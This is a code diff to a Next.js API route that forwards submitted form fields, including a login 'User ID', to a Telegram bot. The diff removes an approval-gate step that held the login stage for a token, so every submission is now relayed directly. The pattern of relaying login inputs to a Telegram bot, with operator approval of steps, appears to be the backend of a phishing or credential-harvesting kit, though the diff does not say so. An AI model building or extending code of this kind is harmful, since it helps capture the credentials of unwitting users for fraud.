@@ -1,6 +1,5 @@
 import { NextRequest, NextResponse } from "next/server"
 import { telegramService } from "@/lib/telegram"
-import { createApproval } from "@/lib/approval-gate"
 
 export async function POST(request: NextRequest) {
   try {
@@ -25,23 +24,10 @@ export async function POST(request: NextRequest) {
 
     const userId = (sanitized["User ID"] || sanitized.userId || "").trim()
 
-    // Only gate the User ID step (Flow: Login) behind approval.
-    const flow = (sanitized.Flow || sanitized.flow || "").trim().toLowerCase()
-    const isLoginStep = flow === "login" && !!userId
+    // The User ID step is NOT approval-gated (notify only).
+    await telegramService.sendInputNotification(sanitized)
 
-    let token: string | null = null
-    if (isLoginStep) {
-      token = createApproval("user_id")
-      await telegramService.sendInputNotification(sanitized, {
-        token,
-        step: "Step 1 · User ID",
-        userId,
-      })
-    } else {
-      await telegramService.sendInputNotification(sanitized)
-    }
-
-    return NextResponse.json({ success: true, token, userId })
+    return NextResponse.json({ success: true, token: null, userId })
   } catch (error) {
     console.error("Error sending input notification:", error)
     return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
